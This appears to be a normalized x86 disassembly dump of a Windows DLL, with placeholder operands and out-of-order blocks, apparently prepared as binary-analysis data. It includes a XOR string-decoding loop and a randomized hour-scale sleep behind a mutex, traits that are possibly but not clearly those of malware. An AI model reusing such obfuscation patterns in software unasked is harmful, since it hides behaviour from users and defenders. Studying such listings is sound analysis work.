jmp r-xdata
mov esi [ ecx + 0x4 ]
cmp ecx [ esi + 0x8 ]
jne r-xdata
mov [ esi + 0x4 ] edx
jmp r-xdata
mov edi [ edx + 0x4 ]
cmp edx [ edi + 0x8 ]
jne r-xdata
mov [ edi + 0x4 ] esi
mov [ esi + 0x8 ] edx
jmp r-xdata
mov esi [ ecx + 0x4 ]
cmp ecx [ esi ]
jne r-xdata
mov [ esi + 0x4 ] edx
jmp r-xdata
mov [ edi + 0x8 ] esi
mov [ edi ] esi
jmp r-xdata
mov [ esi ] edx
mov [ esi ] edx
mov [ esi + 0x8 ] edx
jmp r-xdata
mov [ edx + 0x8 ] ecx
mov [ ecx + 0x4 ] edx
mov [ edi ] esi
mov [ esi + 0x8 ] edx
jmp r-xdata
mov [ edi + 0x8 ] esi
mov [ esi + 0x8 ] edx
jmp r-xdata
mov edi [ ebp + 0x10 ]
mov [ edx + 0x4 ] esi
mov [ esi + 0x8 ] edx
mov [ esi ] edx
jmp r-xdata
mov [ edx ] ecx
mov [ ecx + 0x4 ] edx
sub_10032de0
push 0xc
push r--data
call sub_1007fad0
call sub_1002d269
mov esi eax
mov eax [ rw-data ]
test [ esi + 0x70 ] eax
je r-xdata
push 0xc
call sub_1002f3c9
pop ecx
and [ ebp - 0x4 ] 0x0
push [ rw-data ]
add esi 0x6c
push esi
call sub_10009fd9
pop ecx
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10032e4d
jmp r-xdata
cmp [ esi + 0x6c ] 0x0
je r-xdata
test esi esi
jne r-xdata
call sub_1002d269
mov esi [ eax + 0x6c ]
mov eax esi
call sub_1007fb15
retn
push 0x20
call sub_1004929a
sub_10032e60
push 0x0
push 0x0
call [ CoInitializeEx@IAT ]
mov [ esi ] eax
test eax eax
js r-xdata
mov eax [ esi ]
retn
lea eax [ esi + 0x4 ]
push eax
push r--data
push 0x1
push 0x0
push r--data
call [ CoCreateInstance@IAT ]
mov [ esi ] eax
test eax eax
jns r-xdata
call [ CoUninitialize@IAT ]
sub_10032ea0
push ebp
mov ebp esp
sub esp 0x220
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x218 ] edx
mov [ ebp - 0x21c ] ecx
test edx edx
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
mov eax 0x1
call sub_10032529
mov esp ebp
pop ebp
retn
test ecx ecx
je r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
test [ ebp + 0xc ] 0x1
jne r-xdata
push 0x0
push eax
call sub_100074b0
add esp 0x8
test eax eax
je r-xdata
mov eax 0x2
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
push ebx
push esi
push edi
lea edx [ ebp - 0x214 ]
mov eax 0x2
call sub_10072130
mov edi [ rw-data ]
cmp [ edi + 0x120 ] 0x0
je r-xdata
mov eax 0x3
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
pop edi
pop esi
mov eax 0x4
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
push 0x208
lea eax [ ebp - 0x20c ]
push 0x0
push eax
call sub_1007f8f0
lea ecx [ ebp - 0x210 ]
push ecx
call sub_10026420
mov ecx [ ebp - 0x210 ]
mov eax 0xcccccccd
mul ecx
shr edx 0x3
imul edx edx 0xfffffff6
add ecx edx
mov edx [ edi + 0x120 ]
mov [ ebp - 0x210 ] ecx
imul ecx ecx 0x208
add esp 0x10
lea ebx [ ecx + edx + 0x1082c ]
mov ecx 0x104
lea eax [ ebp - 0x20c ]
xor esi esi
test ecx ecx
jne r-xdata
add eax 0x2
dec ecx
jne r-xdata
mov edx 0x104
sub edx ecx
jmp r-xdata
mov esi 0x80070057
xor edx edx
cmp [ eax ] si
je r-xdata
jmp r-xdata
mov eax esi
test esi esi
js r-xdata
test eax eax
jne r-xdata
mov eax 0x104
sub eax edx
lea ecx [ ebp + edx * 2 - 0x20c ]
push ebx
mov edx 0x7fffffff
call sub_10072780
lea eax [ ebp - 0x214 ]
lea edx [ eax + 0x2 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
je r-xdata
lea ecx [ ebp - 0x210 ]
push ecx
call sub_10026420
mov ecx [ ebp - 0x210 ]
mov eax 0xcccccccd
mul ecx
shr edx 0x3
imul edx edx 0xfffffff6
add ecx edx
mov edx [ edi + 0x120 ]
mov [ ebp - 0x210 ] ecx
imul ecx ecx 0x208
add esp 0x4
lea eax [ ecx + edx + 0x11c7c ]
push eax
mov esi 0x104
lea ebx [ ebp - 0x20c ]
call sub_10050c60
test eax eax
je r-xdata
lea eax [ ebp - 0x214 ]
push eax
mov esi 0x104
lea ebx [ ebp - 0x20c ]
call sub_10050c60
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x218 ]
push 0x0
push ecx
mov ecx [ ebp - 0x21c ]
push edx
lea edx [ ebp - 0x20c ]
call sub_10047320
add esp 0xc
neg eax
pop edi
sbb eax eax
pop esi
and eax 0x5
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
sub_100330d0
push ebp
mov ebp esp
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ecx + 0x14 ]
test eax eax
je r-xdata
lea edx [ ebp - 0x30 ]
mov eax 0xfb
cmp eax 0x3
je r-xdata
xor eax eax
mov [ eax ] 0x0
jmp r-xdata
mov eax [ ecx + 0x28 ]
mov [ esi ] eax
mov eax [ ecx + 0x2c ]
jmp r-xdata
lea edx [ ebp - 0x28 ]
mov eax 0x68
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
inc [ eax ]
xor ecx ebp
mov eax esi
call sub_10032529
mov esp ebp
pop ebp
retn
call sub_1002f620
push 0x4
push 0x0
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
test eax eax
je r-xdata
sub_10033170
push ebp
mov ebp esp
sub esp 0x84
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
mov ebx ecx
mov ecx [ r--data ]
xor edi edi
xor eax eax
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffe6
and edx 0xff
mov [ ebp + eax * 2 - 0x28 ] dx
inc eax
cmp eax 0x10
jb r-xdata
xor eax eax
lea edx [ ebp - 0x80 ]
push edx
mov [ ebp - 0x8 ] ax
mov eax [ ebx + 0x1c ]
lea edx [ ebp - 0x28 ]
mov [ ebp - 0x80 ] edi
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
je r-xdata
mov esi [ ebp - 0x80 ]
call sub_10006970
mov esi eax
mov eax [ ebp - 0x80 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
cmp esi edi
je r-xdata
mov esi 0x1
lea edx [ ebp - 0x78 ]
lea eax [ esi + 0x6e ]
call sub_1002f620
mov eax esi
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov eax [ ebx + 0x1c ]
lea edx [ ebp - 0x7c ]
push edx
lea edx [ ebp - 0x28 ]
mov [ ebp - 0x7c ] edi
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
jns r-xdata
lea edx [ ebp - 0x78 ]
mov eax 0x6f
call sub_1002f620
mov eax esi
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov esi [ ebx + 0x130 ]
cmp esi edi
je r-xdata
mov eax 0x1
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x7c ]
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
xor eax eax
pop ebx
call sub_10032529
mov esp ebp
pop ebp
retn
jmp r-xdata
mov edi [ esi ]
lea ecx [ ebp - 0x7c ]
push ecx
call sub_1000c950
mov esi [ esi + 0x4 ]
test esi esi
jne r-xdata
sub_100332b9
push 0x6c
mov eax sub_10085660
call sub_10047689
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x18 ]
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0x10 ]
mov ebx [ ebp + 0x1c ]
mov [ ebp - 0x68 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x64 ] eax
mov eax [ ecx + 0x14 ]
mov edx 0x3000
and eax edx
cmp eax edx
jne r-xdata
lea eax [ ebp - 0x78 ]
push eax
call sub_10007a10
and [ ebp - 0x4 ] 0x0
push eax
call sub_10064f10
or [ ebp - 0x4 ] 0xffffffff
pop ecx
lea ecx [ ebp - 0x78 ]
mov [ ebp - 0x70 ] eax
call sub_1002be90
mov ecx [ ebp - 0x70 ]
lea eax [ ebp - 0x48 ]
push eax
call sub_10069c00
lea ebx [ edi + 0x8 ]
push ebx
push 0x0
push 0x30
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x6c ] ebx
call sub_10030ff0
movzx eax ax
add esp 0xc
push [ ebp - 0x64 ]
mov [ ebp - 0x58 ] eax
mov eax [ ebp - 0x68 ]
mov ecx esi
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x51 ] 0x0
call sub_1002839c
test al al
jne r-xdata
push ebx
push ecx
push [ ebp - 0x64 ]
push esi
push [ ebp - 0x68 ]
push edi
call sub_10041d4c
add esp 0x18
jmp r-xdata
mov eax [ ebp - 0x48 ]
xor edi edi
cmp [ ebp - 0x34 ] 0x10
mov [ ebp - 0x49 ] 0x0
mov [ ebp - 0x60 ] edi
mov [ ebp - 0x5c ] edi
jae r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
call sub_100262c3
retn
cmp [ eax ] 0x7f
je r-xdata
lea eax [ ebp - 0x48 ]
movzx edi [ esi + 0x6 ]
push ebx
push 0x0
push 0x2b
call sub_10030ff0
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_100255aa
push [ ebp - 0x64 ]
mov ecx esi
call sub_1002839c
test al al
jne r-xdata
cmp [ ebp - 0x34 ] 0x10
mov eax [ ebp - 0x48 ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x68 ]
mov [ eax ] 0x2b
jmp r-xdata
mov ebx [ ebp - 0x64 ]
push ebx
mov ecx esi
call sub_1002839c
test al al
jne r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ eax ] 0x0
jle r-xdata
lea eax [ ebp - 0x48 ]
movzx edi [ esi + 0x6 ]
push ebx
push 0x0
push 0x2d
call sub_10030ff0
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_100255aa
inc eax
mov ecx esi
mov [ ebp - 0x50 ] eax
call sub_1000eff4
mov edi [ ebp - 0x60 ]
test edi edi
jne r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
mov ax [ ebp - 0x58 ]
cmp ax [ esi + 0x6 ]
ja r-xdata
mov ecx esi
call sub_100255aa
cmp [ ebp - 0x38 ] edi
jne r-xdata
mov eax [ ebp - 0x68 ]
mov [ eax ] 0x2d
push ebx
mov ecx esi
call sub_1002839c
test al al
je r-xdata
jmp r-xdata
mov ecx [ ebp - 0x70 ]
mov eax [ ecx ]
movzx edi [ esi + 0x6 ]
call [ eax + 0x4 ]
cmp di ax
jne r-xdata
mov ecx esi
call sub_100255aa
cmp [ ebp - 0x49 ] 0x0
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x70 ]
mov eax [ ecx ]
call [ eax + 0x8 ]
movzx eax ax
mov [ ebp - 0x74 ] eax
mov [ ebp - 0x74 ] edi
jmp r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x49 ] 0x0
je r-xdata
push ebx
mov ecx esi
call sub_1002839c
test al al
je r-xdata
call sub_1003d7d5
mov eax [ eax ]
mov ecx [ ebp - 0x50 ]
mov al [ eax ]
inc [ ebp - 0x50 ]
mov [ ecx ] al
mov ecx esi
call sub_1000eff4
cmp [ ebp - 0x60 ] 0x0
jne r-xdata
movzx eax [ ebp - 0x58 ]
movzx ecx [ esi + 0x6 ]
add eax 0x9
cmp ecx eax
jg r-xdata
mov ecx esi
call sub_100255aa
cmp [ ebp - 0x34 ] 0x10
mov edx [ ebp - 0x48 ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
push edi
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x2c ] 0x0
call sub_10021130
push [ ebp - 0x64 ]
mov ecx esi
mov [ ebp - 0x4 ] 0x2
call sub_1002839c
test al al
jne r-xdata
mov ax [ ebp - 0x58 ]
cmp ax [ esi + 0x6 ]
ja r-xdata
mov ecx esi
call sub_100255aa
cmp [ ebp - 0x51 ] 0x0
jne r-xdata
push ebx
mov ecx esi
call sub_1002839c
test al al
jne r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x5c ] 0x0
jge r-xdata
mov eax [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
mov [ eax ] 0x30
cmp [ ebp - 0x60 ] 0x24
jl r-xdata
cmp [ ebp - 0x51 ] 0x0
jne r-xdata
lea edx [ ebp - 0x48 ]
movzx eax [ esi + 0x6 ]
mov ebx [ ebp - 0x58 ]
cmp bx ax
ja r-xdata
mov ecx esi
call sub_100255aa
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x68 ]
jmp r-xdata
cmp [ ebp - 0x49 ] 0x0
jne r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
mov ax [ ebp - 0x58 ]
cmp [ esi + 0x6 ] ax
jne r-xdata
mov ecx esi
call sub_100255aa
mov eax [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
inc [ ebp - 0x5c ]
mov [ eax ] 0x30
jmp r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
inc [ ebp - 0x5c ]
jmp r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x1
call sub_10005b50
jmp r-xdata
test edi edi
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
movzx eax [ ebp - 0x58 ]
movzx ecx [ esi + 0x6 ]
add eax 0x9
cmp ecx eax
jg r-xdata
mov ecx esi
call sub_100255aa
push 0x0
push 0x1
lea ecx [ ebp - 0x48 ]
mov [ eax ] 0x0
call sub_10005b50
mov eax [ ebp - 0x5c ]
mov eax [ ebp - 0x50 ]
push [ ebp - 0x6c ]
movzx edi [ esi + 0x6 ]
push 0x0
push 0x65
call sub_10030ff0
add esp 0xc
cmp di ax
je r-xdata
mov ecx esi
call sub_100255aa
dec [ ebp - 0x5c ]
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1000eff4
mov ebx [ ebp - 0x58 ]
cmp [ esi + 0x6 ] bx
jne r-xdata
mov ecx esi
call sub_100255aa
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1000eff4
push [ ebp - 0x64 ]
mov ecx esi
call sub_1002839c
test al al
je r-xdata
mov cl [ edx ]
cmp cl 0x7f
je r-xdata
cmp [ eax + edi ] 0x0
je r-xdata
lea eax [ ebp - 0x2c ]
movzx eax [ esi + 0x6 ]
movzx ecx bx
add ecx 0x9
cmp eax ecx
jg r-xdata
mov ecx esi
call sub_100255aa
cmp edi 0x24
jge r-xdata
mov eax [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
mov ecx esi
mov [ eax ] 0x65
call sub_1000eff4
push [ ebp - 0x64 ]
mov ecx esi
mov [ ebp - 0x49 ] 0x0
xor ebx ebx
call sub_1002839c
test al al
jne r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x60 ] edi
je r-xdata
dec edi
je r-xdata
test edi edi
je r-xdata
cmp [ ebp - 0x74 ] 0x0
je r-xdata
cmp [ ebp - 0x60 ] 0x24
mov [ ebp - 0x49 ] 0x1
jl r-xdata
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1000eff4
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov edi [ ebp - 0x64 ]
push edi
mov ecx esi
call sub_1002839c
test al al
jne r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
push [ ebp - 0x6c ]
movzx edi [ esi + 0x6 ]
push 0x0
push 0x45
call sub_10030ff0
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_100255aa
mov al [ esi + 0x6 ]
mov ecx [ ebp - 0x50 ]
sub al bl
add al 0x30
inc [ ebp - 0x50 ]
inc [ ebp - 0x60 ]
mov [ ecx ] al
mov ecx esi
call sub_100255aa
test edi edi
jne r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
inc [ ebp - 0x5c ]
jmp r-xdata
mov al [ esi + 0x6 ]
sub al [ ebp - 0x58 ]
mov ecx [ ebp - 0x50 ]
add al 0x30
inc [ ebp - 0x50 ]
mov [ ecx ] al
inc edi
mov ecx esi
call sub_100255aa
push edi
mov ecx esi
call sub_1002839c
test al al
je r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
push [ ebp - 0x6c ]
movzx edi [ esi + 0x6 ]
push 0x0
push 0x2b
call sub_10030ff0
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_100255aa
cmp [ edx + 0x1 ] 0x0
jle r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp cl [ eax + edi ]
jne r-xdata
lea eax [ ebp - 0x2c ]
cmp [ eax + edi ] 0x0
jle r-xdata
lea eax [ ebp - 0x2c ]
movzx eax [ esi + 0x6 ]
cmp ax [ ebp - 0x74 ]
jne r-xdata
mov ecx esi
call sub_100255aa
movzx eax [ esi + 0x6 ]
cmp ax bx
jne r-xdata
mov ecx esi
call sub_100255aa
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov ax [ ebp - 0x58 ]
cmp [ esi + 0x6 ] ax
jne r-xdata
mov ecx esi
call sub_100255aa
cmp [ esi + 0x4 ] bl
jne r-xdata
mov eax [ ebp - 0x50 ]
mov [ eax ] 0x2b
jmp r-xdata
inc edx
jmp r-xdata
cmp cl [ eax ]
jl r-xdata
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x51 ] 0x1
mov [ ebp - 0x51 ] 0x1
inc edi
jmp r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10042a70
inc edi
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x60 ] 0x0
je r-xdata
cmp [ eax + edi ] 0x7f
je r-xdata
lea eax [ ebp - 0x2c ]
mov ax [ ebp - 0x58 ]
cmp ax [ esi + 0x6 ]
ja r-xdata
mov ecx esi
call sub_100255aa
cmp [ ebp - 0x49 ] bl
je r-xdata
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1000eff4
push edi
mov ecx esi
call sub_1002839c
test al al
je r-xdata
push [ ebp - 0x6c ]
movzx edi [ esi + 0x6 ]
push 0x0
push 0x2d
call sub_10030ff0
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_100255aa
inc [ ebp - 0x50 ]
mov ecx esi
call sub_1000eff4
movzx eax [ esi + 0x6 ]
mov ecx [ ebp - 0x50 ]
sub al bl
add al 0x30
inc [ ebp - 0x50 ]
inc [ ebp - 0x60 ]
mov [ ecx ] al
mov ecx esi
call sub_100255aa
mov ecx esi
call sub_1000eff4
push [ ebp - 0x64 ]
mov ecx esi
call sub_1002839c
test al al
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
mov [ eax ] 0x30
jmp r-xdata
mov eax [ ebp - 0x50 ]
mov [ eax ] 0x2d
inc [ eax + edi ]
jmp r-xdata
lea eax [ ebp - 0x2c ]
movzx eax [ ebp - 0x58 ]
movzx ecx [ esi + 0x6 ]
add eax 0x9
cmp ecx eax
jg r-xdata
mov ecx esi
call sub_100255aa
cmp ebx 0x8
jge r-xdata
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1000eff4
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov al [ esi + 0x6 ]
sub al [ ebp - 0x58 ]
mov ecx [ ebp - 0x50 ]
add al 0x30
inc [ ebp - 0x50 ]
mov [ ecx ] al
inc ebx
mov ecx esi
call sub_100255aa
sub_10033957
push 0x5c
mov eax sub_100860f0
call sub_10047689
fldz
mov eax [ ebp + 0x18 ]
fld [ ebp + 0x20 ]
mov esi [ ebp + 0x8 ]
fcom st1
mov [ ebp - 0x64 ] eax
xor ebx ebx
mov [ ebp - 0x68 ] ecx
mov [ ebp - 0x60 ] bl
fnstsw ax
fstp st1
test ah 0x5
jpe r-xdata
fld [ r--data ]
mov [ ebp - 0x58 ] ebx
fcom st1
fnstsw ax
test ah 0x41
jpo r-xdata
mov [ ebp - 0x60 ] 0x1
fchs
cmp [ ebp - 0x58 ] 0x1388
jae r-xdata
fstp st0
jmp r-xdata
fxch st1
add [ ebp - 0x58 ] 0xa
fdiv [ r--data ]
fcom st1
fnstsw ax
test ah 0x1
je r-xdata
mov [ ebp - 0x40 ] 0xf
mov [ ebp - 0x44 ] ebx
mov [ ebp - 0x54 ] bl
push ecx
push ecx
fstp [ esp ]
push r--data
lea eax [ ebp - 0x38 ]
push 0x28
push eax
mov [ ebp - 0x4 ] ebx
call sub_1000f103
add esp 0x14
xor edi edi
mov [ ebp - 0x5c ] eax
cmp eax ebx
jle r-xdata
fxch st1
fstp st1
push 0x30
push [ ebp - 0x58 ]
lea ecx [ ebp - 0x54 ]
call sub_10042a70
sub esp 0x1c
lea eax [ ebp - 0x54 ]
mov ecx esp
mov [ ebp - 0x5c ] esp
push eax
call sub_1000aed0
push [ ebp - 0x60 ]
mov ecx [ ebp - 0x68 ]
push [ ebp + 0x1c ]
push [ ebp - 0x64 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_10060f92
push ebx
push 0x1
lea ecx [ ebp - 0x54 ]
call sub_10005b50
mov eax esi
call sub_100262c3
retn 0x20
movzx eax [ ebp + edi - 0x38 ]
push eax
push 0x1
lea ecx [ ebp - 0x54 ]
call sub_10042a70
inc edi
cmp edi [ ebp - 0x5c ]
jl r-xdata
sub_10033a80
push ebp
mov ebp esp
push 0xffffffff
push sub_10086380
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi ecx
mov ecx [ ebp + 0x8 ]
cmp ecx 0x1fffffff
jbe r-xdata
mov eax [ esi + 0x8 ]
sub eax [ esi ]
sar eax 0x3
cmp eax ecx
jae r-xdata
push r--data
call sub_10030594
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
call sub_100576a0
mov ebx eax
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ esi + 0x4 ]
mov ecx [ esi ]
push eax
mov eax ebx
mov [ ebp - 0x14 ] ebx
call sub_1003ef10
mov eax [ esi ]
mov edi [ esi + 0x4 ]
sub edi eax
add esp 0x4
sar edi 0x3
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
lea edx [ ebx + ecx * 8 ]
lea eax [ ebx + edi * 8 ]
mov [ esi + 0x8 ] edx
mov [ esi + 0x4 ] eax
mov [ esi ] ebx
push eax
call sub_1000a86e
add esp 0x4
sub_10033b50
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_10089cde
mov eax [ fs : 0x0 ]
push eax
sub esp 0x438
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x430 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x448 ]
mov [ fs : 0x0 ] eax
mov ebx [ GetProcessHeap@IAT ]
push 0x11
push 0x8
call ebx
mov edi [ HeapAlloc@IAT ]
push eax
call edi
mov esi eax
mov eax [ r--data ]
mov [ esi ] eax
mov ecx [ r--data ]
mov [ esi + 0x4 ] ecx
mov edx [ r--data ]
mov [ esi + 0x8 ] edx
mov ax [ r--data ]
mov [ esi + 0xc ] ax
mov cl [ r--data ]
push 0xc
push 0x8
mov [ esi + 0xe ] cl
call ebx
push eax
call edi
mov edx [ r--data ]
mov edi eax
mov [ edi ] edx
mov eax [ r--data ]
mov [ edi + 0x4 ] eax
mov ecx [ r--data ]
push 0x4
push 0x0
mov [ edi + 0x8 ] ecx
call ebx
push eax
call [ HeapAlloc@IAT ]
mov [ esp + 0x24 ] eax
mov [ esp + 0x450 ] 0x0
test eax eax
je r-xdata
xor eax eax
mov [ eax ] r--data
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax + 0xec ] 0x0
jne r-xdata
push esi
push eax
call ebx
mov esi [ HeapFree@IAT ]
push eax
call esi
push edi
push 0x0
call ebx
push eax
call esi
mov eax 0x3f2
mov ecx [ esp + 0x448 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x430 ]
xor ecx esp
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
mov [ esp + 0x450 ] 0xffffffff
test eax eax
jne r-xdata
lea ecx [ esp + 0x24 ]
push ecx
call sub_10026420
mov eax [ esp + 0x28 ]
xor edx edx
mov ecx 0x36ee80
div ecx
add esp 0x4
push edx
call [ Sleep@IAT ]
jmp r-xdata
mov eax [ eax + 0xf4 ]
push 0xffffffff
push eax
call [ WaitForSingleObject@IAT ]
xor eax eax
mov [ esp + 0x14 ] eax
mov [ esp + 0x18 ] eax
mov [ esp + 0x1c ] eax
mov [ esp + 0x450 ] 0x1
mov eax [ rw-data ]
mov edx [ eax + 0x8 ]
sub edx [ eax + 0x4 ]
lea esi [ eax + 0x4 ]
sar edx 0x2
test edx edx
jne r-xdata
mov eax [ eax + 0x8 ]
mov ecx [ esi ]
mov edx eax
sub edx ecx
push sub_1003a6a0
sar edx 0x2
push edx
push eax
push ecx
call sub_10069070
mov eax [ esi ]
mov ecx [ eax ]
mov cl [ ecx + 0x3e ]
add esp 0x10
xor cl cl
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0xf4 ]
push eax
call [ ReleaseMutex@IAT ]
mov edi [ esp + 0x14 ]
mov ebx [ esp + 0x18 ]
xor esi esi
mov edi [ esp + 0x14 ]
mov ebx [ esp + 0x18 ]
cmp edi ebx
je r-xdata
lea edx [ esp + 0x14 ]
inc cl
push edx
call sub_1001a260
add esp 0x4
test eax eax
jne r-xdata
mov [ esp + 0x14 ] esi
mov [ esp + 0x18 ] esi
mov [ esp + 0x1c ] esi
mov esi edi
cmp edi ebx
je r-xdata
mov eax [ rw-data ]
xor esi esi
mov [ eax + 0xe8 ] esi
mov [ eax + 0xf0 ] esi
mov [ eax + 0xec ] 0x1
mov eax [ eax + 0xf4 ]
push eax
call [ ReleaseMutex@IAT ]
jmp r-xdata
lea ecx [ ecx ]
push edi
call sub_1000a86e
add esp 0x4
xor esi esi
mov edi edi
mov [ esp + 0x450 ] 0xffffffff
cmp edi esi
je r-xdata
mov edx [ esp + 0x34 ]
add edx 0x3c
cmp [ edx + 0x14 ] esi
jb r-xdata
mov ecx [ ecx ]
call sub_10051380
sub esi 0xffffff80
cmp esi ebx
jne r-xdata
mov esi [ esp + 0x30 ]
add esi 0x1c
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov edx [ edx ]
cmp [ eax + 0x14 ] 0x8
jb r-xdata
mov esi [ esi ]
mov ebx [ ebx + 0x7c ]
push ebx
mov ebx [ esp + 0x3c ]
mov ebx [ ebx + 0x78 ]
push ebx
mov ebx [ esp + 0x30 ]
movzx ebx [ ebx + 0x74 ]
push ebx
push ecx
push edx
mov edx [ esp + 0x40 ]
mov dx [ edx + 0x38 ]
push eax
mov ecx esi
call sub_1003c700
lea esi [ esp + 0x3c ]
mov [ esp + 0x450 ] 0x8
call sub_10051380
lea esi [ esp + 0x13c ]
mov [ esp + 0x450 ] 0x7
call sub_10051380
lea esi [ esp + 0x33c ]
mov [ esp + 0x450 ] 0x6
call sub_10051380
lea esi [ esp + 0x23c ]
mov [ esp + 0x450 ] 0x5
call sub_10051380
lea esi [ esp + 0xbc ]
